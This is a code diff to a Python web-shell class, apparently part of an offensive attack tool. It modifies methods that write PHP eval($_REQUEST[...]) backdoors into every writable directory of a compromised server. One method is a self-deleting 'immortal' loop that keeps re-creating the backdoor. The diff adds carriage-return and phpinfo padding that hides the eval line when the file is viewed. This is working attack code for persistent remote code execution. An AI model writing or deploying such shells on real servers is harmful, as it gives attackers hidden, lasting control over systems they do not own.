@@ -98,8 +98,8 @@ class WebShell():
 
     def auto_inject_memery_webshell(self, filename, password):
         Log.info("Auto inject memery webshell...")
-        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $password = '%s'; $content = '<?php eval($_REQUEST['.$password.']);?>'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, password)
-        Log.info(webshell_content)
+        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $password = '%s'; $content = '<?php eval($_REQUEST['.$password.']);?>'.'\r<?php phpinfo();?>                                           \n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, password)
+        Log.info("Code : [%s]" % (repr(webshell_content)))
         base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
         writable_dirs = self.get_writable_directory()
         for writable_dir in writable_dirs:
@@ -541,15 +541,16 @@ class WebShell():
 
     def auto_inject_webshell(self, filename, password):
         Log.info("Auto injecting : [%s] => [%s]" % (filename, password))
-        webshell_content = "<?php eval($_REQUEST[%s]);?>" % (password)
-        Log.info("Code : [%s]" % (webshell_content))
+        webshell_content = "<?php eval($_REQUEST[%s]);?>\r<?php phpinfo();?>                                        \n" % (password)
+        Log.info("Code : [%s]" % (repr(webshell_content)))
+        Log.info("Length : [%d]" % (len(webshell_content)))
         Log.info("Getting writable dirs...")
         writable_dirs = self.get_writable_directory()
         if len(writable_dirs) == 0:
             Log.error("No writable dirs...")
         else:
             for writable_dir in writable_dirs:
-                Log.info("Writing [%s] into : [%s]" % (webshell_content, writable_dir))
+                Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
                 base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
